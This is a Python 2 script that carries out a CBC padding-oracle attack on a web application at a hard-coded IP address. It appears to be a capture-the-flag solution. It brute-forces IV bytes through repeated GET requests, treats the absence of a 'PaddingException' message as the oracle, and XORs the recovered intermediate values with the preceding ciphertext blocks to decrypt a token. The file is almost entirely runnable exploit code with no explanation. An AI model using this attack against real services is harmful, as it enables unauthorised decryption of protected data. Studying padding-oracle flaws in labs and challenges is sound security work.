import sys
import os
import base64
import binascii
import requests

base_url = "http://35.196.135.216/3275375310/?post=%s"

b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
b64e = lambda x: base64.encodestring(x).replace('=','~').replace('/','!').replace('+','-')

paddedVal = lambda imv,pos: chr(imv ^ pos)
hexxor = lambda x, y : x^y

def xor(iv,cipher_block):
	result = []
	for x in range(len(iv)):
		result.append(hexxor(ord(iv[x]),ord(cipher_block[x])))
	print ''.join(map(chr,result))

def chunks(l, n):
	result = []
	for i in range(0, len(l), n):
		result.append(l[i:i + n])
	return result

def modify_string(string, position, new_value):
	str_list = list(string)
	str_list[position] = new_value
	return ''.join(str_list)

def find_me_the_imv(cipher_text,known_values):
	iv = '\x00' * (16 - len(known_values)) +  ''.join([ paddedVal(val, len(known_values)+1) for val in known_values ])
	pos = -1 * (len(known_values)+1)
	while  True:

		resp = requests.get(base_url % b64e(iv + cipher_text))
		if 'PaddingException' not in resp.content:
			known_values.insert(0, ord(paddedVal(len(known_values)+1,ord(iv[pos]))))
			return known_values

		iv = modify_string(iv,pos,chr(ord(iv[pos]) + 1))

def xor_me(IV,IMV):
	result = ''
	for x in range(len(IV)):
		result += chr(hexxor(IV[x],IMV[x]))
	return result

cipherstring = "w9GY1wDePQ666DXlmx-TG7BXw-kafyEylx7-gFE2Iq86-xJ-z2r0KVcCv48r7vlupEvUj!3SZIBiPZ9VIXmgs2dMuoYAAR5d23rRAe1v3WdsxZLTJETsVzo80IdvbEApPPFspwv3oSYROBNQ3LzHLY3VZ0oJYh5sA6X4eoEW52IHxX-3voEtCQIfZ9LXB-IOTSM3H7d-ywzRnw!sWSLOjw~~"

decoded = b64d(cipherstring)
cipher_texts = chunks(decoded,16)
#print len(cipher_texts)
#imv = [113, 162, 1, 201, 156, 252, 39, 3, 8, 21, 109, 216, 221, 13, 232, 4]
#imv = [201, 129, 51, 33, 56, 59, 74, 3, 96, 205, 191, 59, 247, 120, 163, 50]
#print  map(lambda x: ord(x),cipher_texts[(0+2)*-1])
#xor = xor_me(imv,map(lambda x: ord(x),cipher_texts[-3]))
#print xor


IMVs = []
result = []
for idx, cipher_text in enumerate(reversed(cipher_texts)):
	if idx == len(cipher_texts)-1:
		continue
	known_values = []
	while len(known_values) < len(cipher_text):
 		known_values = find_me_the_imv(cipher_text,known_values)
 		print known_values
 	result.insert(0,xor_me(known_values,map(lambda x: ord(x),cipher_texts[(idx+2)*-1])))
 	print result